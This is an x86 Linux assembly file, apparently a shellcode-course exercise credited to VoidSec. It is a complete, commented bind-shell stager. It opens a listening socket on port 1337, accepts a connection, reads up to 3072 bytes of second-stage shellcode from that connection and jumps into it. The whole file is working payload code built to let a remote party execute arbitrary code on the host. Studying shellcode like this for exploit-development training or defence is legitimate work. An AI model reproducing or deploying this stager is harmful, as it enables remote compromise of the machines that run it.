; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

;----------- Create Socket ----------------------------
xor ebx,ebx			; zeroing out EBX = 0
push ebx			; pushing 0 on the stack 0 (protocol)
inc ebx				; incrementing EBX = 1
push ebx			; pushing 1 on the stack 1 (SOCK_STREAM)
push byte +0x2		; pushing 2 on the stack 2 (AF_INET)
push byte +0x66		; pushing syscall 102 (socketcall) on the stack
pop eax				; load syscall 102 in EAX
cdq					; clean EDX
mov ecx,esp			; load stack pointer to ECX
int 0x80			; execute socketcall systemcall
;----------- Bind the Socket --------------------------
xchg eax,esi		; store the socket file descriptor in ESI
inc ebx				; EBX = 2 (BIND)
push edx			; push 0 on the stack (INADDR_ANY)
push word 0x5c11	; port 1337 in little endian (PORT)
push bx				; 2 AF_INET
mov ecx,esp			; store pointer to the structure in ECX
push byte +0x66		; pushing syscall 102 (socketcall) on the stack
pop eax				; load syscall 102 in EAX
push eax			; use it as sizeof(struct sockaddr_in)
push ecx			; &serv_addr
push esi			; our socket descriptor
mov ecx,esp			; store pointer to arguments in ECX
int 0x80			; execute system call
;----------- Listen socket for incoming connection ----
mov al,0x66			; load syscall 102 in EAX
shl ebx,1			; increase EBX to 4 for listen function call number
int 0x80			; execute system call
;----------- Accept Connection ------------------------
push edx			; NULL addrlen
push edx			; NULL sockaddr
push esi			; sockfd
inc ebx				; increase sub function number in BL to 5 for accept
mov ecx,esp			; store pointer to arguments in ECX
mov al,0x66			; store sys_socketcall system call number in EAX
int 0x80			; execute system call
;----------- Read from file descriptor, 2nd stage -----
xchg eax,ebx		; clean EAX
mov dh,0xc			; set size to 3072 bytes
mov al,0x3			; load sys_read system call in AL
int 0x80			; execute system call
;----------- Transfer execution to 2nd stage -----
mov edi,ebx			; store socket file descriptor in edi
jmp ecx				; directly jump in ECX that will contain our 2nd stage shellcode